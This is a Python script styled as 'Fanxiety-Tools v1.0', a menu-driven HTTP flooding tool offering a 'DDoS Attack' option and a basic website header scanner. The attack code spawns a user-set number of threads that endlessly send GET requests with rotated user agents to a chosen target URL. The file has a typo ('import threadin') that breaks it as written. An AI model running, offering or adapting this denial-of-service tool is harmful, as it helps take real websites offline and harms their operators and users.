import threadin
import requests
import time
import random
import socket
from colorama import Fore, Style, init

init(autoreset=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]

def attack(target_url, delay):
    while True:
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(target_url, headers=headers)
            print(f"{Fore.GREEN}[✓] {Fore.WHITE}Request sent! {Fore.CYAN}Status: {Fore.YELLOW}{response.status_code}")
        except Exception as e:
            print(f"{Fore.RED}[✗] {Fore.WHITE}Error: {Fore.YELLOW}{e}")
        time.sleep(delay)

def scan_website(url):
    try:
        domain = url.split("//")[-1].split("/")[0]
        ip_address = socket.gethostbyname(domain)

        response = requests.get(url)
        server_header = response.headers.get('Server', 'Not found')

        technologies = []
        if 'x-powered-by' in response.headers:
            technologies.append(response.headers['x-powered-by'])
        if 'x-generator' in response.headers:
            technologies.append(response.headers['x-generator'])

        print(f"\n{Fore.BLUE}╔{'═'*50}╗")
        print(f"║{Fore.RED}{'WEBSITE SCAN RESULTS':^50}{Fore.BLUE}║")
        print(f"╠{'═'*50}╣")
        print(f"║ {Fore.WHITE}URL: {Fore.CYAN}{url.ljust(44)}{Fore.BLUE}║")
        print(f"║ {Fore.WHITE}IP Address: {Fore.CYAN}{ip_address.ljust(37)}{Fore.BLUE}║")
        print(f"║ {Fore.WHITE}Server: {Fore.CYAN}{server_header.ljust(41)}{Fore.BLUE}║")
        print(f"║ {Fore.WHITE}Technology: {Fore.CYAN}{', '.join(technologies).ljust(37)}{Fore.BLUE}║")
        print(f"╚{'═'*50}╝")
    except Exception as e:
        print(f"{Fore.RED}[✗] {Fore.WHITE}Error while scanning: {Fore.YELLOW}{e}")

def print_banner():
    print(f"""{Fore.RED}
███████╗ █████╗ ███╗   ██╗██╗  ██╗██╗███████╗████████╗██╗   ██╗
██╔════╝██╔══██╗████╗  ██║╚██╗██╔╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
█████╗  ███████║██╔██╗ ██║ ╚███╔╝ ██║█████╗     ██║    ╚████╔╝ 
██╔══╝  ██╔══██║██║╚██╗██║ ██╔██╗ ██║██╔══╝     ██║     ╚██╔╝  
██║     ██║  ██║██║ ╚████║██╔╝ ██╗██║███████╗   ██║      ██║   
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝      ╚═╝   
    {Fore.BLUE}Fanxiety-Tools v1.0{Style.RESET_ALL}
    """)

def print_menu():
    print(f"{Fore.WHITE}╔{'═'*50}╗")
    print(f"║{Fore.CYAN}{'MAIN COURSE':^50}{Fore.WHITE}║")
    print(f"╠{'═'*50}╣")
    print(f"║ {Fore.BLUE}1.{Fore.RED} DDoS Attack{' '*35}{Fore.WHITE}║")
    print(f"║ {Fore.BLUE}2.{Fore.RED} Website Scanning{' '*30}{Fore.WHITE}║")
    print(f"║ {Fore.BLUE}3.{Fore.RED} Exit{' '*42}{Fore.WHITE}║")
    print(f"╚{'═'*50}╝")

def fanxiety_tool():
    print_banner()
    print_menu()
    
    choice = input(f"\n{Fore.YELLOW}[?]{Fore.WHITE} Select options: ")
    
    if choice == "1":
        print(f"\n{Fore.BLUE}╔{'═'*50}╗")
        print(f"║{Fore.RED}{'ATTACK CONFIGURATION':^50}{Fore.BLUE}║")
        print(f"╠{'═'*50}╣")
        
        thread_count = int(input(f"{Fore.BLUE}║ {Fore.WHITE}Number of Threads (example: 100): "))
        target_url = input(f"{Fore.BLUE}║ {Fore.WHITE}Target URL: ")
        delay = float(input(f"{Fore.BLUE}║ {Fore.WHITE}Delay (second): "))
        print(f"╚{'═'*50}╝")
        
        print(f"\n{Fore.MAGENTA}[!] {Fore.WHITE}Starting the attack on {Fore.CYAN}{target_url}")
        print(f"{Fore.MAGENTA}[!] {Fore.WHITE}Press {Fore.RED}CTRL+C {Fore.WHITE}to stop\n")
        
        for _ in range(thread_count):
            thread = threading.Thread(target=attack, args=(target_url, delay))
            thread.daemon = True
            thread.start()
        
        while True:
            time.sleep(1)
    
    elif choice == "2":
        target_url = input(f"\n{Fore.BLUE}║ {Fore.WHITE}Enter URL to scan: ")
        scan_website(target_url)
    
    elif choice == "3":
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Exit the program...")
        exit()
    
    else:
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Invalid option!")

if __name__ == "__main__":
    try:
        fanxiety_tool()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Attack stopped!")
        exit()
